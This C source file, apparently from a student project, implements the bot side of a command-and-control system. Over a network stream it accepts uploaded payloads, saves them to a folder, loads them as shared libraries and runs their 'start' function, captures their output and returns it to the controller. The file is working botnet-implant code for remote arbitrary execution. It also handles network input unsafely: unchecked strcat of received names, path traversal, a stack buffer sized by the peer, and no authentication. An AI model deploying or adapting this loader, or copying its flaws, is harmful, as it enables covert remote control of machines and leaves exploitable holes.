#include "gestionCandc.h"

extern int idResultat;
extern int diffTemps;
extern ptr_cellule listResult;

/**********************************************************/
/**Fonction initiale pour lancer le traitement des taches**/
/**********************************************************/

void charge(void *arg){
		FILE* dialogue =*((FILE**)arg);
		char ligne[MAX_LIGNE];

		while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
				printf("%s\n",ligne);

				if(strcmp(ligne,"upload?\n")==0)
						installChargeBot(dialogue);
				else if(strcmp(ligne,"execute?\n")==0)
						runChargeBot(dialogue);
				else if(strcmp(ligne,"result?\n")==0)
						resultChargeBot(dialogue);
				else if(strcmp(ligne,"delet?\n")==0)
						deleteChargeBot(dialogue);
				else if(strcmp(ligne, "STAT\n")==0)
					 	statusBot(dialogue);
				else if(strcmp(ligne,"QUIT\n")==0){
						fclose(dialogue);
						break;
				}
	  }
}


void statusBot(FILE* dialogue){
	int life = diffTemps;
	int nb_exec = idResultat;

	int nb_charges = -1; //car fichier .gitignore pour éviter que le répertoire vide se supprime sur git
	DIR * dirp;
	struct dirent * entry;

	dirp = opendir("charges");
	while ((entry = readdir(dirp)) != NULL) {
    	if (entry->d_type == DT_REG) {
         	nb_charges++;
    	}
	}
	closedir(dirp);

	fprintf(dialogue,"%d,%d,%d\n", life, nb_charges, nb_exec);
}

void installChargeBot(FILE* dialogue){
    char ligne[MAX_LIGNE];
    char name[T_CHARGE];
    int name_size;
    int charge_size;
    fprintf(dialogue,"OKupload\n");

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%d",&name_size);
      fprintf(dialogue,"OKname_size\n");
    }

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%s",name);
      fprintf(dialogue,"OKname\n");
    }

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%d",&charge_size);
      fprintf(dialogue,"OKdata_size\n");
    }

    unsigned char content[charge_size];
		char chemin[T_CHEMIN]="./charges/";
		strcat(chemin,name);
    FILE* c = fopen(chemin,"w+");
    int i=0;
    while(i<charge_size)
      i+=fread(content+i,1,1,dialogue);

    i=fwrite(content,1,charge_size,c);
    if(i!=charge_size)
      perror("erreur sauvegarde charge");

    fclose(c);

    fprintf(dialogue,"bye\n");

    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL)
      if(strcmp(ligne,"bye\n")==0)
        break;

}

void runChargeBot(FILE* dialogue){
    char ligne[MAX_LIGNE];
    char name[T_CHARGE];
    int name_size;
    void* handle;
    char *error;

    fprintf(dialogue,"OKexecute\n");

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%d",&name_size);
      fprintf(dialogue,"OKname_size\n");
    }

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%s",name);
      char chemin[T_CHEMIN]="./charges/";
      strcat(chemin,name);
      handle = dlopen(chemin,RTLD_NOW);
      if (!handle) {
				fprintf(dialogue, "NOKname\n");
        return;
      }

      *(void **) (&start) = dlsym(handle, "start");
      if ((error = dlerror()) != NULL)  {
        fprintf(stderr, "%s\n", error);
				fprintf(dialogue, "NOKname\n");
        return;
      }

      //ici on va redirigier la sortie standard vers un fichier resultat et stocker
      //dans une stucture l'id de resultat, le nom du fichier, et la taille
      char result[T_CHARGE]="./resultats/result_";
			char ind[5];   //9999 id possibles
		  sprintf(ind,"%d",idResultat+1);
			strcat(result,ind);
      strcat(result,name);
      int d=open(result,O_WRONLY|O_APPEND|O_CREAT,S_IRWXU);

			P(REDIRECTION);
      int stock=dup(1);
      dup2(d,1);
      (*start)();
      dlclose(handle);
      dup2(stock,1);
			V(REDIRECTION);
			close(d);

      struct stat buf;
      stat(result,&buf);
      int resultSize = buf.st_size;

      P(ID_RESULTAT);
      idResultat++;
			V(ID_RESULTAT);
			P(LISTE_RESULTAT);
      inserer(&listResult,idResultat,result,resultSize);
			V(LISTE_RESULTAT);

      fprintf(dialogue,"OKname\n");
      fprintf(dialogue,"%d\n",idResultat);
    }

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      if(strcmp(ligne,"OKid\n")==0){
        fprintf(dialogue,"bye\n");
      }
    }

    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL)
      if(strcmp(ligne,"bye\n")==0)
        break;

}

void resultChargeBot(FILE* dialogue){
    int indx;
    char ligne[MAX_LIGNE];
    fprintf(dialogue,"OKresult\n");
    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        sscanf(ligne,"%d",&indx);

        ptr_cellule r = listResult;
				if(r!=NULL){
		        while(r->id_result!=indx){
		            r=r->suivant;
		            if(r==NULL){
		              fprintf(dialogue,"NOKid\n");
		              break;
		            }
		        }
						if(r!=NULL){
            fprintf(dialogue,"OKid\n");
            fprintf(dialogue,"%d\n",r->size_result);
            if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
                if(strcmp(ligne,"OKresult_size\n")==0){
                  //ici on doit envoyer le contenu du resultat
                  FILE* c=fopen(r->name_result,"r");
                  unsigned char cont[r->size_result];
                  int i=fread(cont,1,r->size_result,c);
                  if(i!=r->size_result)
                    perror("erreur recuperation resultat");
                  
                  i=0;
                  while(i<r->size_result){
                    i+=fwrite(cont+i,1,1,dialogue);
                  }
                  fclose(c);
                }
            }
            while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
              if(strcmp(ligne,"bye\n")==0){
                fprintf(dialogue,"bye\n");
                break;
              }
            }
          }
			 }
			 else fprintf(dialogue,"NOKid\n");
    }

}

void deleteChargeBot(FILE* dialogue){
    int name_size;
		char name_charge[T_CHARGE];
    char ligne[MAX_LIGNE];
		char chemin[T_CHEMIN]="./charges/";
    fprintf(dialogue,"OKdelet\n");

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%d",&name_size);
      fprintf(dialogue,"OKname_size\n");
    }

    if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
      sscanf(ligne,"%s",name_charge);
			strcat(chemin,name_charge);
		}

    if(remove(chemin) == 0){
      	fprintf(dialogue,"OKname\n");
        while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
          if(strcmp(ligne,"bye\n")==0){
            fprintf(dialogue,"bye\n");
            break;
          }
        }
    }
    else{
      	fprintf(dialogue,"NOKname\n");
  	}

}
